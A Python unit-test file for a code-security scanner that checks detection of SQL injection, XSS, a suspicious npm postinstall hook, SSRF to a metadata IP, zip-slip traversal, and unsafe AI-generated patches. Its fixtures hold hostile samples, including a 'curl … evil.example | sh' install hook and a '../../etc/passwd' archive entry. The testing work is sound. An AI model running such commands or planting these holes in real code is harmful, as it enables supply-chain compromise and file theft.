import io
import json
import socket
import unittest
import zipfile
from unittest.mock import patch

from aicodeshield import ai_remediation
from aicodeshield.intake import (
    evaluate_passive_web_response,
    extract_safe_zip_entries,
    inspect_website_passive,
    validate_safe_public_url,
)
from aicodeshield.scanner import scan_sources


class IntakeAndSecurityTests(unittest.TestCase):
    def test_negative_safe_code_produces_zero_false_positives(self):
        report = scan_sources("safe-project", [
            {
                "path": "safe/app.py",
                "content": (
                    "# eval(user_input) in a comment must not trigger PY001\n"
                    "import ast, subprocess, yaml\n"
                    "def safe_parse(text, cursor, uid):\n"
                    "    val = ast.literal_eval(text)\n"
                    "    subprocess.run(['ls', '-l'], shell=False, check=True)\n"
                    "    cursor.execute('SELECT * FROM users WHERE id = ?', (uid,))\n"
                    "    cfg = yaml.safe_load('a: 1')\n"
                    "    return val, cfg\n"
                ),
            },
            {
                "path": "safe/ui.js",
                "content": (
                    "// child_process.exec('ls') comment\n"
                    "function updateLabel(el, text) {\n"
                    "  el.textContent = text;\n"
                    "}\n"
                ),
            },
        ])
        self.assertEqual(2, report["files_scanned"])
        self.assertEqual([], report["findings"])

    def test_detects_sql_injection_xss_and_suspicious_postinstall_hook(self):
        report = scan_sources("vuln-suite", [
            {
                "path": "vuln/db.py",
                "content": (
                    "def get_user(cursor, uid):\n"
                    "    return cursor.execute(f'SELECT * FROM users WHERE id = {uid}')\n"
                ),
            },
            {
                "path": "vuln/search.js",
                "content": "el.innerHTML = req.query.q;\n",
            },
            {
                "path": "vuln/package.json",
                "content": json.dumps({
                    "name": "bad-pkg",
                    "scripts": {"postinstall": "curl -s https://evil.example/p.sh | sh -c"},
                }),
            },
        ])
        rule_ids = {item["rule_id"] for item in report["findings"]}
        self.assertIn("PY003", rule_ids)
        self.assertIn("JS003", rule_ids)
        self.assertIn("PKG001", rule_ids)

    def test_ssrf_validator_blocks_http_localhost_and_private_ips(self):
        with self.assertRaisesRegex(ValueError, "Only HTTPS"):
            validate_safe_public_url("http://example.com")
        with self.assertRaisesRegex(ValueError, "Localhost"):
            validate_safe_public_url("https://localhost/admin")
        with self.assertRaisesRegex(ValueError, "not in the authorized target allowlist"):
            validate_safe_public_url("https://example.com", allowed_hosts={"allowed.org"})

        fake_addrinfo = [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("169.254.169.254", 443))]
        with patch("socket.getaddrinfo", return_value=fake_addrinfo):
            with self.assertRaisesRegex(ValueError, "Blocked SSRF attempt"):
                validate_safe_public_url("https://metadata.internal.example")

    def test_zip_slip_path_traversal_is_rejected(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("repo-main/../../etc/passwd.py", "print('pwn')")
        with self.assertRaisesRegex(ValueError, "Zip-Slip"):
            extract_safe_zip_entries(buf.getvalue())

    def test_passive_website_inspection_requires_explicit_authorization(self):
        with self.assertRaisesRegex(ValueError, "Explicit authorization"):
            inspect_website_passive("https://example.com", authorized=False)

    def test_passive_web_header_and_cookie_evaluation(self):
        findings = evaluate_passive_web_response(
            "https://portal.example.com",
            headers={"Content-Type": "text/html"},
            set_cookies=["sessionid=abc123xyz; Path=/"],
            body_text="<script>document.getElementById('out').innerHTML = location.hash;</script>",
        )
        rule_ids = {f["rule_id"] for f in findings}
        self.assertEqual({"WEB001", "WEB002", "WEB003", "WEB004", "WEB005", "WEB006"}, rule_ids)
        serialized = json.dumps(findings)
        self.assertNotIn("abc123xyz", serialized)

    def test_untrusted_ai_patch_validator_rejects_unsafe_or_broken_code(self):
        broken = ai_remediation.validate_candidate_patch("app.py", "def broken(:\n    pass")
        self.assertFalse(broken["syntax_valid"])
        self.assertFalse(broken["accepted_for_review"])
        self.assertEqual("rejected_unsafe_or_invalid_patch", broken["status"])

        still_unsafe = ai_remediation.validate_candidate_patch("app.py", "result = eval(user_input)")
        self.assertTrue(still_unsafe["syntax_valid"])
        self.assertFalse(still_unsafe["security_rescan_passed"])
        self.assertIn("PY001", still_unsafe["residual_findings"])
        self.assertFalse(still_unsafe["accepted_for_review"])

        safe_patch = ai_remediation.validate_candidate_patch(
            "app.py",
            "import ast\nresult = ast.literal_eval(user_input)",
        )
        self.assertTrue(safe_patch["syntax_valid"])
        self.assertTrue(safe_patch["security_rescan_passed"])
        self.assertTrue(safe_patch["accepted_for_review"])
        self.assertTrue(safe_patch["untrusted_candidate"])
        self.assertTrue(safe_patch["requires_human_approval"])


if __name__ == "__main__":
    unittest.main()
